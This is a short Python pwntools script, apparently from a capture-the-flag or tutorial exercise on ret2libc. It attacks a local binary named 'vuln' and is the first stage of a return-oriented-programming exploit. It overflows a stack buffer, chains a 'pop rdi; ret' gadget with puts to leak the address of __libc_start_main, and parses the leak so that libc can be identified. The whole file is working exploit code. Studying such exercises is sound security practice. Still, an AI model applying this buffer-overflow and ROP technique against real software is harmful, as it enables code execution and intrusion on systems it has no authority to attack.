#!/usr/bin/python
# https://tasteofsecurity.com/security/ret2libc-unknown-libc/

from pwn import *

p = process('./vuln') # start the vuln binary
elf = ELF('./vuln') # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

# Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget

puts = elf.plt['puts']
libc_start_main = elf.symbols['__libc_start_main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"

log.info('puts@plt: ' + hex(puts))
log.info('__libc_start_main: ' + hex(libc_start_main))
log.info('pop rdi gadget: ' + hex(pop_rdi))

overflow = 'A' * 32 + 'B' * 8 # overflow until ret

# create rop chain
rop = overflow + p64(pop_rdi) + p64(libc_start_main) + p64(puts)

# send payload after the printed message
p.sendlineafter("ROP.", rop)

# parse leaked address
p.recvline()
p.recvline()
received = p.recvline().strip()
leak = u64(received.ljust(8, '\x00'))
log.info('Leaked libc address, __libc_start_main: %s' % hex(leak))

p.close()
